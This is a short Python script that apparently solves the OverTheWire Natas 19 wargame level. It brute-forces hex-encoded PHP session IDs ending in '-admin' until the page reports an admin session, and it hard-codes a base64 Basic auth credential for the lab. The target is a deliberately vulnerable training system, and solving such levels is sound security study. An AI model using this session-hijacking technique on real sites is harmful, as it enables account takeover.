import requests
import re
import os
import sys

AUTH = 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=='

def check(session_id):
    url = 'http://natas19.natas.labs.overthewire.org/index.php'
    cookies = dict(PHPSESSID=session_id)

    html_text = requests.get(url, headers={'Authorization': AUTH}, cookies=cookies).text
  
    result = bool(re.search('You are an admin', html_text))
    return [result, html_text]

for i in range(999):
    os.system('clear')
    digits = list(str(i)) 
    code = '3' + '3'.join(digits) + '2'

    print("%.2f" % (i * 100 / 999) + '%');

    result = check(code + 'd61646d696e')
    if (result[0]):
        print(result[1])
        sys.exit()
